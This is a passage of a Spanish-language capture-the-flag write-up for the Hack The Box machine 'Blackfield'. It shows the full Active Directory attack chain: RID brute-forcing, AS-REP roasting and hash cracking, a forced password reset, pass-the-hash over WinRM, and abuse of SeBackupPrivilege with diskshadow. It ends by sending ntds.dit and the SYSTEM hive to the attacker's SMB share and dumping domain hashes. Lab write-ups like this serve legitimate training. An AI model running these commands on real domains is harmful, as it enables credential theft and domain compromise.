+      </div><div class="admonition-content mt-3 text-base leading-relaxed text-inherit"><p>El rid es un identificador único que se le asigna a un objeto (como un usuario o un grupo por ejemplo), para el AD es como una especie de &ldquo;alias&rdquo; y se usa para hacer referencia a dicho objeto.</p>
+<p>Tanto el <code>--users</code> como el <code>--rid-brute</code> (y sus variantes) pueden dar como resultado información relevante del AD como usuarios y grupos</p></div></div><div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ nxc smb blackfield.local -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> --rid-brute
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>+<span class="o">]</span> BLACKFIELD.local<span class="se">\:</span> 
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>-<span class="o">]</span> Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - <span class="o">{</span>Access Denied<span class="o">}</span> A process has requested access to an object but has not been granted those access rights.</span></span></code></pre></div></div>
+<p>Esta vez es diferente el resultado, tenemos un <strong>Access Denied</strong>, lo cual nos impide seguir con esa enumeración ya que no disponemos de un usuario válido verdad ?</p>
+<p>Usualmente se tienen 2 formas de poder interactuar con esta clase de cosas, una es con sesiones nulas, la otra es usando el usuario <em>guest</em> (sin contraseña, claro), usualmente el usuario <em>guest</em> está deshabilitado, pero no deja de ser una posible mala configuración que dejaron en esa máquina. Pongámoslo a prueba !!</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nxc smb blackfield.local -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --rid-brute</span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1451"
+    height="274"
+    src="/writeupps/htb-blackfield/image-1_hu_d695d09254f9318d.png"
+    srcset="/writeupps/htb-blackfield/image-1_hu_d695d09254f9318d.png 800w, /writeupps/htb-blackfield/image-1_hu_8ba8da45a94c4d31.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-1.png"></figure>
+<p>Notamos que esta vez nos arroja resultados, son muchos usuarios, antes de intentar un password spraying intentaremos verificar si alguno de esos es vulnerable a un ataque de ASREP-ROAST.</p>
+<div class="admonition relative overflow-hidden rounded-lg border-l-4 my-3 px-4 py-3 shadow-sm" data-type="nota">
+      <div class="flex items-center gap-2 font-semibold text-inherit">
+        <div class="flex shrink-0 h-5 w-5 items-center justify-center text-lg"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 128c17.67 0 32 14.33 32 32c0 17.67-14.33 32-32 32S224 177.7 224 160C224 142.3 238.3 128 256 128zM296 384h-80C202.8 384 192 373.3 192 360s10.75-24 24-24h16v-64H224c-13.25 0-24-10.75-24-24S210.8 224 224 224h32c13.25 0 24 10.75 24 24v88h16c13.25 0 24 10.75 24 24S309.3 384 296 384z"/></svg>
+</span></div>
+        <div class="grow">
+          Nota
+        </div>
+      </div><div class="admonition-content mt-3 text-base leading-relaxed text-inherit"><p>El ataque de ASREP-ROAST permite capturar el hash de la contraseña del usuario cuando este dispone de la característica <code>Do not require Kerberos preauthentication</code> habilitada en el AD</p></div></div><p>Para esto, primero debemos obtener todos los usuarios del output resultante del comando anterior así que lo trataremos de la siguiente manera:</p>
+<ol>
+<li>Colocar toda la salida del comando en un archivo llamado output</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nxc smb blackfield.local -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --rid-brute &gt; output</span></span></code></pre></div></div>
+<ol start="2">
+<li>Debemos obtener todas las líneas de los usuarios, para esto realizaremos un filtro con <code>grep</code> para obtener las líneas en donde se tenga la palabra <strong>SidTypeUSer</strong></li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cat output <span class="p">|</span> grep <span class="s2">&#34;SidTypeUser&#34;</span></span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="929"
+    height="376"
+    src="/writeupps/htb-blackfield/image-2_hu_487b066c735e68ac.png"
+    srcset="/writeupps/htb-blackfield/image-2_hu_487b066c735e68ac.png 800w, /writeupps/htb-blackfield/image-2.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-2.png"></figure>
+<ol start="3">
+<li>Ahora tenemos que obtener solo los usernames, para ello aplicaremos los siguientes filtros y lo guardaremos en un archivo llamado <em>users</em></li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cat output <span class="p">|</span> grep <span class="s2">&#34;SidTypeUser&#34;</span> <span class="p">|</span> tr -s <span class="s1">&#39; &#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f <span class="m">6</span> <span class="p">|</span> cut -d <span class="s1">&#39;\&#39;</span> -f <span class="m">2</span> &gt; users</span></span></code></pre></div></div>
+<p>Ahora utilizaremos el archivo <em>users</em> para poder realizar el ataque de ASREP-ROAST, esto se logra gracias a la herramienta <code>impacket-GetNPUsers</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">impacket-GetNPUsers -no-pass -usersfile users blackfield.local/</span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1254"
+    height="236"
+    src="/writeupps/htb-blackfield/image-3_hu_6b88f6b68782b789.png"
+    srcset="/writeupps/htb-blackfield/image-3_hu_6b88f6b68782b789.png 800w, /writeupps/htb-blackfield/image-3.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-3.png"></figure>
+<p>Encontramos que el usuario <em>support</em> es suceptible a este ataque razón por la cual podemos obtener el hash de su contraseña, intentaremos descifrarla utilizando el dicionario <em>rockyou.txt</em>, para esto guardaremos todo el contenido del hash en un archivo llamado <em>hash</em> y utilizaremos la herramienta <code>john</code> para intentar obtener dicha contraseña</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ john <span class="nb">hash</span> --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos <span class="m">5</span> AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Will run <span class="m">12</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl"><span class="c1">#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     </span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>...<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session completed.</span></span></code></pre></div></div>
+<p>Con esto obtenemos la contraseña: <code>#00^BlackKnight</code></p>
+<p>Verificaremos la credencial obtenida</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ nxc smb blackfield.local -u support -p <span class="s1">&#39;#00^BlackKnight&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>+<span class="o">]</span> BLACKFIELD.local<span class="se">\s</span>upport:#00^BlackKnight</span></span></code></pre></div></div>
+<p>Vemos que la credencial es válida, no tiene altos privilegios (diría <em>pwned</em> en la herramienta), tampoco permite ingresar por WinRM entonces ejecutaremos <code>bloodhound</code> y veremos que permisos tiene este usuario</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1292"
+    height="269"
+    src="/writeupps/htb-blackfield/image-4_hu_5a3bf23f1ac951.png"
+    srcset="/writeupps/htb-blackfield/image-4_hu_5a3bf23f1ac951.png 800w, /writeupps/htb-blackfield/image-4_hu_bca319e1dafd7c0d.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-4.png"></figure>
+<p>Dentro de bloodhound notamos que tiene el permiso de <code>ForceChangePassword</code> hacia el usuario <em>audit2020</em>, pero el usuario <em>audit2020</em> no dispone de algún permiso sobre otro objeto, esto probablemente podría ser un rabbit hole, pero lo realizaremos de igual manera, no siempre los permisos en los objetos nos dicen el camino, siempre hay otras cosas por verificar&hellip;</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">net rpc password <span class="s2">&#34;audit2020&#34;</span> <span class="s2">&#34;Password123.&#34;</span> -U <span class="s2">&#34;BLACKFIELD.LOCAL&#34;</span>/<span class="s2">&#34;support&#34;</span>%<span class="s2">&#34;#00^BlackKnight&#34;</span> -S <span class="s2">&#34;10.129.229.17&#34;</span></span></span></code></pre></div></div>
+<p>Ahora verificaremos el cambio</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ nxc smb blackfield.local -u audit2020 -p <span class="s1">&#39;Password123.&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>+<span class="o">]</span> BLACKFIELD.local<span class="se">\a</span>udit2020:Password123.</span></span></code></pre></div></div>
+<p>Notamos que la contraseña fué cambiada con éxito, pero ahora qué ?</p>
+<p>Verificaremos si se disponen de recursos compartidos por SMB</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ nxc smb blackfield.local -u audit2020 -p <span class="s1">&#39;Password123.&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>+<span class="o">]</span> BLACKFIELD.local<span class="se">\a</span>udit2020:Password123. 
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             forensic        READ            Forensic / Audit share.
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             NETLOGON        READ            Logon server share 
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             profiles$       READ            
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             SYSVOL          READ            Logon server share</span></span></code></pre></div></div>
+<p>Notamos varias carpetas, entre ellas una llamada <em>forensic</em>, el nombre parece algo llamativo, para esto navegaremos en esa carpeta usando la herramienta <code>smbclientng</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">smbclientng -u <span class="s1">&#39;audit2020&#39;</span> -p <span class="s1">&#39;Password123.&#39;</span> -H blackfield.local</span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="571"
+    height="247"
+    src="/writeupps/htb-blackfield/image-5.png"
+    srcset="/writeupps/htb-blackfield/image-5.png 800w, /writeupps/htb-blackfield/image-5.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-5.png"></figure>
+<p>Ese recurso compartido mantiene cierta estructura entre sus carpetas</p>
+<ul>
+<li>La carpeta <em>command_output</em> parece ser solo eso, salidas de comandos hechas en la misma máquina</li>
+<li>La carpeta <em>memory_analysis</em> contiene archivos <em>.zip</em> los cuales parecen obtener información relevante</li>
+<li>La carpeta <em>tools</em> es solo eso, una carpeta con herramientas sysinternals, volatility, etc.</li>
+</ul>
+<p>La carpeta a la cual mantendremos foco seá la de <em>memory_analysis</em></p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="481"
+    height="344"
+    src="/writeupps/htb-blackfield/image-6.png"
+    srcset="/writeupps/htb-blackfield/image-6.png 800w, /writeupps/htb-blackfield/image-6.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-6.png"></figure>
+<p>Entre los nombres de los archivos copmprimidos vemos uno en particular <em>lsass.zip</em>, específicamente este proceso es el que podría guardar los hashes NTLM de las cuentas de windows logueadas, de ser un dumpeo de ese proceso entonces podriamos aprovecharnos de eso y obtener esos hashes, así que lo descargaremos.</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="572"
+    height="80"
+    src="/writeupps/htb-blackfield/image-7.png"
+    srcset="/writeupps/htb-blackfield/image-7.png 800w, /writeupps/htb-blackfield/image-7.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-7.png"></figure>
+<p>Ejectivamente, al descomprimirlo nos arroja un archivo <em>.DMP</em> el cual parece ser el dump de memoria de ese proceso, para ello se utilizará la herramienta <code>pypykatz</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">pypykatz lsa minidump lsass.DMP</span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="824"
+    height="591"
+    src="/writeupps/htb-blackfield/image-8_hu_4b954cdc7cd8b552.png"
+    srcset="/writeupps/htb-blackfield/image-8_hu_4b954cdc7cd8b552.png 800w, /writeupps/htb-blackfield/image-8.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-8.png"></figure>
+<p>En la salidaa de la herramienta podemos obtener el hash NT del usuario <em>svc_backup</em>, probaremos si dicha credencial es válida</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ nxc smb blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>+<span class="o">]</span> BLACKFIELD.local<span class="se">\s</span>vc_backup:9658d1d1dcd9250115e2205d9f48400d</span></span></code></pre></div></div>
+<p>Antes de verificar los permisos de ese usuario sobre objetos del AD en bloodhound probaremos si este usuario dispone de acceso por WinRM</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ nxc winrm blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+</span></span><span class="line"><span class="cl">WINRM       10.129.229.17   <span class="m">5985</span>   DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> 
+</span></span><span class="line"><span class="cl">WINRM       10.129.229.17   <span class="m">5985</span>   DC01             <span class="o">[</span>+<span class="o">]</span> BLACKFIELD.local<span class="se">\s</span>vc_backup:9658d1d1dcd9250115e2205d9f48400d <span class="o">(</span>Pwn3d!<span class="o">)</span></span></span></code></pre></div></div>
+<p>Perfecto, esto nos confirma que podemos tener acceso al sistema como el usuario <em>svc_backup</em> por lo que ingresaremos utilizando la herramienta <code>evil-winrm</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i blackfield.local</span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1026"
+    height="192"
+    src="/writeupps/htb-blackfield/image-9_hu_d0df57f9201c3cf7.png"
+    srcset="/writeupps/htb-blackfield/image-9_hu_d0df57f9201c3cf7.png 800w, /writeupps/htb-blackfield/image-9.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-9.png"></figure>
+<p>Una vez dentro, enumeraremos los permisos de este usuario sobre el sistema</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">whoami /all</span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="994"
+    height="781"
+    src="/writeupps/htb-blackfield/image-10_hu_24618234e327f08a.png"
+    srcset="/writeupps/htb-blackfield/image-10_hu_24618234e327f08a.png 800w, /writeupps/htb-blackfield/image-10.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-10.png"></figure>
+<p>Vemos que tenemos los permisos <code>SeBackupPrivilege</code> y <code>SeRestorePrivilege</code>, por lo que en teoría podremos hacer un backup de cualquier cosa que se encuentre dentro del sistema, lo más común que se suele hacer en estos casos es realizar un backup  de los registros del sistema <em>HKLM\SAM</em> y <em>HKLM\SYSTEM</em>, luego pasarla a nuestra máquina y obtener los hashes de las cuentas locales, pero eso en un principio no me dio tantos resultados, por lo que en esta ocasión se utilizará otra forma en la cual se pueda obtener algo aún más importante, el archivo NTDS.DIT.</p>
+<p>Para hacer esto nos apoyaremos del siguiente artículo <a href="https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#5c26"  target="_blank" rel="noreferrer">https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#5c26</a></p>
+<ol>
+<li>Crear un archivo cuyo contenido sea el siguiente:</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">set verbose on
+</span></span><span class="line"><span class="cl">set metadata C:\Windows\Temp\meta.cab
+</span></span><span class="line"><span class="cl">set context clientaccessible
+</span></span><span class="line"><span class="cl">set context persistent
+</span></span><span class="line"><span class="cl">begin backup
+</span></span><span class="line"><span class="cl">add volume C: alias cdrive
+</span></span><span class="line"><span class="cl">create
+</span></span><span class="line"><span class="cl">expose %cdrive% E:
+</span></span><span class="line"><span class="cl">end backup</span></span></code></pre></div></div>
+<p>Si copiamos y pegamos en un archivo común en un linux tendremos problemas de compatibilidad al momento de procesarlo en windows, esto es debido a los saltos de línea, en linux son &ldquo;\n&rdquo; mientras que en windows es &ldquo;\n\r&rdquo;, pero eso se soluciona colocando la línea de comando <code>unix2dos &lt;nombre_archivo&gt;</code></p>
+<ol start="2">
+<li>Pasarlo a la máquina víctima</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">wget </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">15</span><span class="p">.</span><span class="mf">231</span><span class="err">:</span><span class="mf">8000</span><span class="p">/</span><span class="n">instructions</span><span class="p">.</span><span class="py">txt</span> <span class="n">-O</span> <span class="n">instructions</span><span class="p">.</span><span class="n">txt</span></span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="919"
+    height="182"
+    src="/writeupps/htb-blackfield/image-11_hu_214d4b10e68e1c54.png"
+    srcset="/writeupps/htb-blackfield/image-11_hu_214d4b10e68e1c54.png 800w, /writeupps/htb-blackfield/image-11.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-11.png"></figure>
+<ol start="3">
+<li>Ejecutar el comando diskshadow pasándole como argumento el archivo con instrucciones</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">diskshadow</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">s</span> <span class="n">instructions</span><span class="p">.</span><span class="n">txt</span></span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="920"
+    height="669"
+    src="/writeupps/htb-blackfield/image-12_hu_d4457a1b787af907.png"
+    srcset="/writeupps/htb-blackfield/image-12_hu_d4457a1b787af907.png 800w, /writeupps/htb-blackfield/image-12.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-12.png"></figure>
+<p>Esto crea un backup del sistema el cual procederemos a buscar el archivo <em>ntds.dit</em> el cual se encuentra en la ruta <em>E:\windows\ntds\ntds.dit</em></p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="547"
+    height="304"
+    src="/writeupps/htb-blackfield/image-13.png"
+    srcset="/writeupps/htb-blackfield/image-13.png 800w, /writeupps/htb-blackfield/image-13.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-13.png"></figure>
+<ol start="4">
+<li>Lo copiamos dentro de una ruta temporal de la máquina víctima</li>
+</ol>
+<p>Vamos a tener que crear una carpeta temporal o en su defecto usar la carpeta del usuario svc_backup</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">robocopy</span> <span class="p">/</span><span class="n">b</span> <span class="n">E:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">ntds</span> <span class="p">.</span> <span class="n">ntds</span><span class="p">.</span><span class="n">dit</span></span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="662"
+    height="395"
+    src="/writeupps/htb-blackfield/image-15.png"
+    srcset="/writeupps/htb-blackfield/image-15.png 800w, /writeupps/htb-blackfield/image-15.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-15.png"></figure>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="617"
+    height="395"
+    src="/writeupps/htb-blackfield/image-16.png"
+    srcset="/writeupps/htb-blackfield/image-16.png 800w, /writeupps/htb-blackfield/image-16.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-16.png"></figure>
+<ol start="5">
+<li>Realizamos una copia del registro SYSTEM y lo guardamos en el sistema</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">SYSTEM</span></span></span></code></pre></div></div>
+<ol start="6">
+<li>Nos pasamos los archivos SYSTEM y ntds.dit por SMB hacia nuestra máquina</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># Atacante</span>
+</span></span><span class="line"><span class="cl">impacket-smbserver fluwhen <span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span> -smb2support
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Víctima</span>
+</span></span><span class="line"><span class="cl">cp ntds.dit <span class="se">\\</span>10.10.15.231<span class="se">\f</span>luwhen<span class="se">\
+</span></span></span><span class="line"><span class="cl">cp SYSTEM <span class="se">\\</span>10.10.15.231<span class="se">\f</span>luwhen<span class="err">\</span></span></span></code></pre></div></div>
+<ol start="7">
+<li>Utilizamos <code>impacket-secretsdump</code> para obtener los hashes NTLM de los usuarios de dominio :)</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL</span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="887"
+    height="330"
+    src="/writeupps/htb-blackfield/image-17_hu_f2f3b7d4c0568a21.png"
+    srcset="/writeupps/htb-blackfield/image-17_hu_f2f3b7d4c0568a21.png 800w, /writeupps/htb-blackfield/image-17.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image-17.png"></figure>
+<p>Con esto obtenemos el hash ntlm del administrador del dominio, así podemos loguearnos sin preocupaciones hacia la máquina víctiam y obtener las flags que necesitamos.</p>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+
+      </div>
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
